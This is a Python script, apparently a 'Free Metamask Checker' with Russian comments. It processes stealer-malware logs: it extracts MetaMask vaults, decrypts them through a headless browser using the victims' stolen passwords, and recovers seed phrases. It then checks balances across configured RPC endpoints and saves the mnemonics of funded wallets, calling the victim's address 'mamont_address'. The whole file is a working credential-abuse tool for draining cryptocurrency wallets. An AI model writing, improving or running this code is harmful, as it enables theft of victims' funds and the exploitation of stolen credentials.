import glob, ctypes
from selenium import webdriver
from web3 import Web3

decryptor = input("Вставь ссылку на декриптор (если установлен на пк , укажи путь к нему) - ") # C:\Users\Mark\Downloads\MetaMask Vault Decryptor.html

options = webdriver.ChromeOptions()
options.add_argument("headless")
options.add_experimental_option("excludeSwitches", ["enable-logging"])
driver = webdriver.Chrome("settings/chromedriver.exe", chrome_options=options)

goods = 0
passwords_count = 0
wallet_files = 0
new_vault = ""

files = glob.glob("logs/*/*/*/*.log") # чекаем только .log файлы
for file in files:
 try:
   f = open(file, "r", encoding="ascii", errors="surrogateescape") # открываем файл
   text = (f.read()).encode('utf-8', 'replace').decode() # читаем файл

   # достаем vault из файла

   line = text.replace('''{"vault":"{''', "|||||||")
   line2 = line.replace('''"}"},''', "|||||||")
   line3 = line2.split("|||||||")

   for lineZ in line3: # проверяем vault
     if 'salt' in lineZ:
       vault = "{" + lineZ.replace("\\", "") + '"}'
       if "name" in vault:
         break
       else:
         if "address" in vault:
           break
         else:
           if "config" in vault:
             break
           else:
             if "backup" in vault:
               break
             else:
               if vault == new_vault:
                 break
               else:
                 with open("Result.txt", "a") as save:
                   save.write(vault + "\n" + " " + "\n")
                 with open("vaults.txt", "a") as wrt:
                   wrt.write(vault + "|||||" + file.split("]\\")[0] + "]\\Passwords.txt" + "\n")
                 wallet_files = wallet_files + 1
                 wallet_files = wallet_files
                 new_vault = vault
                 break
 except Exception:
   print("Error in - " + file)
   pass

with open("vaults.txt", "r+", encoding="utf-8", errors="surrogateescape") as vaults:
 vault_list = vaults.readlines()
with open("vaults.txt", "w") as wrt:
 wrt.write("")
for info in vault_list:
 vault = info.split("|||||")[0]
 passwords_file = info.split("|||||")[1]
 with open(passwords_file.replace("\n", ""), "r+", encoding="utf-8") as pswds:
   passwords = pswds.readlines()
 for passw in passwords:
   if "Password:" in passw:
     driver.get(decryptor)
     driver.find_element_by_xpath("/html/body/div/div/div/textarea").send_keys(vault)
     password = (passw.replace("Password: ", "")).replace(" ", "")
     driver.find_element_by_xpath("/html/body/div/div/div/input").send_keys(
       password.replace("\n", ""))
     driver.find_element_by_css_selector("body > div > div > div > button").click()
     driver.implicitly_wait(1)
     result = str(driver.find_element_by_xpath("/html/body/div/div/div/div").text)
     if "mnemonic" in result: # достаем фразу и чекаем баланс
       passwords_count = 0
       goods = goods + 1
       goods = goods
       ctypes.windll.kernel32.SetConsoleTitleW(
         "Free Metamask Checker | Passwords - "+ str(passwords_count) +" | Goods - "+ str(goods) +" | Files - " + str(wallet_files))
       mnemo_clear = result.split('{"mnemonic":"')[1]
       mnemo = mnemo_clear.split('","')[0]
       print("-------------------------------------------------------------")
       print(mnemo)
       print("Password - " + password.replace("\n", ""))
       with open("config.txt") as links:
         list = links.readlines()
       for line_link in list:
         link = line_link.split("|||")[0]
         coin = line_link.split("|||")[1]
         rpc_url = str(link)
         web3 = Web3(Web3.HTTPProvider(rpc_url))
         web3.eth.account.enable_unaudited_hdwallet_features()
         account = web3.eth.account.from_mnemonic(str(mnemo))
         mamont_address = account.address
         print(mamont_address)
         balance = web3.eth.get_balance(mamont_address)
         print(coin.replace("\n", "") + " Balance - " + str(
           web3.fromWei(balance, 'ether')))
         if balance > 0:
           with open("Results.txt", "a") as save:
             save.write(mnemo + "\n")
       break
     passwords_count = passwords_count + 1
     passwords_count = passwords_count
     ctypes.windll.kernel32.SetConsoleTitleW(
       "Free Metamask Checker | Passwords - " + str(passwords_count) + " | Goods - " + str(
         goods) + " | Files - " + str(wallet_files))